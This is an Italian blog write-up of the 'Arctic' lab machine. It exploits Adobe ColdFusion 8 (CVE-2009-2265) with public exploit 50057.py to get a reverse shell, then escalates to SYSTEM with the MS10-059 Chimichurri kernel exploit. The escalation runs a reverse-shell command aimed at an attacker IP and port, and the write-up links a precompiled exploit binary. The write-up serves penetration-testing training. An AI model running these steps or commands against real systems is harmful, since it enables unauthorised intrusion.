+++
date = '2026-07-23T12:33:10+02:00'
draft = false
title = 'Arctic Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`04/02/2026`**

![Artic.png](/images/imgs_artic/Artic.png)

---
# Introduzione

**_Arctic_** è una macchina **Windows** di livello **Easy**. L'exploitation path si concentra sulle vulnerabilità dei software non aggiornati. L'accesso iniziale si ottiene sfruttando una misconfiguration di **Directory Listing** su un web server **JRun**, che ci permette di scoprire un'istanza vulnerabile di **Adobe ColdFusion 8**. Sfruttando un exploit pubblico, otteniamo **RCE** e una reverse shell. La Privilege Escalation trovo sia un eccellente esercizio in ottica **OSCP**: partendo da una macchina **Windows Server 2008 R2** priva di patch, si utilizza **Windows Exploit Suggester** per identificare ed eseguire un exploit del kernel (**MS10-059 - Chimichurri**), ottenendo privilegi di **`NT AUTHORITY\SYSTEM`**.

---
# Tecniche Utilizzate

- **Web Enumeration & Directory Listing**

- **Adobe ColdFusion 8 RCE (CVE-2009-2265)**

- **Kernel Exploitation (MS10-059 | CVE-2010-2554 | Chimichurri)**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- arctic
```

```text
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV -p 135,8500,49154 arctic
```

```text
PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  http    syn-ack ttl 127 JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

La porta **8500** espone un web server **JRun**. 
**Nmap** aveva già rilevato che la directory principale mostrava l'indexing del sito (**`Index of /`**).

![index.png](/images/imgs_artic/index.png)

Navigando su **http://arctic:8500**, ed esplorando manualmente le cartelle esposte, ho trovato un path interessante: **`/CFIDE/adminapi/administrator.cfc`**. 

![adminapi.png](/images/imgs_artic/adminapi.png)

Questo mi ha portato su una pagina di login di **Adobe ColdFusion 8**.

![cf.png](/images/imgs_artic/cf.png)

---
# Accesso Iniziale | Adobe ColdFusion 8 RCE

Sapendo la versione esatta del software, ho utilizzato **searchsploit** per cercare eventuali vulnerabilità note:

```bash
searchsploit Adobe ColdFusion 8
```

![search.png](/images/imgs_artic/search.png)

Tra i risultati, ho individuato una **Remote Command Execution**: **`cfm/webapps/50057.py`**.

**Nota**: _Si tratta di un **Unrestricted File Upload** che porta ad una **RCE** **CVE-2009-2265**. **Adobe ColdFusion 8** integra una versione di **FCKeditor** vulnerabile, che permette a utenti non autenticati di caricare file aggirando i controlli sulle estensioni. L'exploit automatizza proprio questo processo: effettua l'upload di un payload malevolo con estensione **`.jsp`** e lo richiama, costringendo il server a eseguirlo._

Ho copiato l'exploit nella mia directory:

```bash
searchsploit -m cfm/webapps/50057.py
```

Ho modificato i parametri **`lhost`**, **`rhosts`**, **`lport`** ed **`rport`** per farli puntare alla mia macchina attaccante e al target. 

![mod.png](/images/imgs_artic/mod.png)

Una volta configurato il mio listener **netcat**, ho lanciato l'exploit:

```bash
python3 50057.py
```

![initial1.png](/images/imgs_artic/initial1.png)

![initial2.png](/images/imgs_artic/initial2.png)


Ho ottenuto una reverse shell sulla macchina target come utente **`tolis`**. 

**User flag**:

```cmd
type C:\Users\tolis\Desktop\user.txt
```

![userf.png](/images/imgs_artic/userf.png)

---
# Privilege Escalation | MS10-059 (Chimichurri)

Con un foothold sul sistema, ho iniziato la fase di post-exploitation. Ho controllato i privilegi del mio utente con **`whoami /priv`** e ho subito notato che il **`SeImpersonatePrivilege`** era abilitato.

![whoamipriv.png](/images/imgs_artic/whoamipriv.png)

Inizialmente ho tentato di abusarne utilizzando varie implementazioni dei classici "**Potato Attacks**" (**`GodPotato-NET2`**, **`GodPotato-NET35`**, **`GotPotato-NET4`**, ecc.), ma senza successo.

Tuttavia, analizzando l'output dell'enumerazione, ho notato due cose fondamentali:

1. Il sistema operativo è un vecchio **Microsoft Windows Server 2008 R2 Standard**.

2. Non c'è installato nessun **Hotfix** (patch di sicurezza).

![sys.png](/images/imgs_artic/sys.png)

Ho cercato quindi **PoC** per vulnerabilità legacy e ho provato vari exploit. Ma dopo svariati tentativi manuali a vuoto, mi sono momentaneamente arreso e sono passato a **Metasploit**: ho generato un payload con **msfvenom**, l'ho trasferito e ho ottenuto una sessione **meterpreter** per lanciare il modulo **`post/multi/recon/local_exploit/suggester`**. Il modulo mi ha inondato di vulnerabilità legate a questa versione specifica, confermando che la via del **Kernel Exploit** era quella corretta.

![msf.png](/images/imgs_artic/msf.png)

**Nota**: _Essendo in preparazione per la certificazione **OSCP**, volevo a tutti i costi trovare un modo per portare a termine la macchina senza dipendere da **Metasploit**. Così, ho cercato un'alternativa e ho trovato uno script **Python** standalone di cui non conoscevo l'esistenza: **[Windows-Exploit-Suggester](https://github.com/strozfriedberg/Windows-Exploit-Suggester)**._

Avendo bisogno di **`Python 2.7`**, ho dovuto sistemare alcune dipendenze locali per far girare correttamente il tool con la libreria **`xlrd`**:

```bash
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2.7 get-pip.py
python2.7 -m pip install xlrd==1.2.0
```

Ho salvato l'output del comando **`systeminfo`** in un file (**`sysinfo.txt`**) e l'ho dato in pasto allo script assieme al database aggiornato delle patch:

```bash
python2.7 windows-exploit-suggester.py -d 2026-07-22-mssb.xls -i sysinfo.txt
```

![expsugg.png](/images/imgs_artic/expsugg.png)

Lo script ha confermato l'output di **Metasploit**, restituendo decine di **CVE** critiche. Invece di perdere tempo a compilare exploit scritti in **`C`**/**`go`**, ho cercato qualcosa di pre-compilato e immediatamente utilizzabile.

Ho individuato la vulnerabilità **MS10-059** nota come **Chimichurri**.

**Nota**: _Questa vulnerabilità di **Local Privilege Escalation** (**CVE-2010-2554**) risiede in un difetto del componente **Tracing Feature for Services** del kernel di **Windows**. Poiché il sistema non convalida e gestisce correttamente le richieste in memoria, un attaccante con privilegi limitati può forzare l'esecuzione di codice arbitrario._

Ho scaricato l'eseguibile pre-compilato da questo repository **GitHub**:

- **https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe?source=post_page-----84fd7ab89349---------------------------------------**

Ho trasferito **`Chimichurri.exe`** sul target, ho messo in ascolto un nuovo listener sulla mia macchina e ho lanciato l'exploit passandogli il mio IP e la porta.

```bash
Chimichurri.exe <attacker_ip> <attacker_port>
```

![privesc.png](/images/imgs_artic/privesc.png)

Dopo qualche secondo, ho ricevuto una connessione come **`NT AUTHORITY\SYSTEM`**, completando con successo la macchina senza alcun tool automatizzato.

![root.png](/images/imgs_artic/root.png)

---
# Considerazioni Finali

**_Arctic_** è una macchina semplice, ma didattica.

Dal punto di vista dell'Accesso Iniziale, lo scenario evidenzia due peccati capitali nella gestione dei server web: lasciare abilitato l'**Open Directory Indexing** ed esporre su reti pubbliche interfacce amministrative di software gravemente obsoleti (in questo caso, **ColdFusion 8**).

Per la Privilege Escalation, la tentazione di affidarsi a **Metasploit** è stata forte, specialmente non essendo inizialmente a conoscenza di **Windows-Exploit-Suggester**. Tuttavia, per me che sono in ottica **OSCP**, affrontare una macchina come questa e forzarmi a cercare un'alternativa manuale è stato uno step fondamentale per imparare a non dipendere dall'automazione spinta.

**Fonti**:

- **Windows-Exploit-Suggester | https://github.com/strozfriedberg/Windows-Exploit-Suggester**

- **pre-compilato MS10-059 Chimichurri.exe | https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe?source=post_page-----84fd7ab89349---------------------------------------**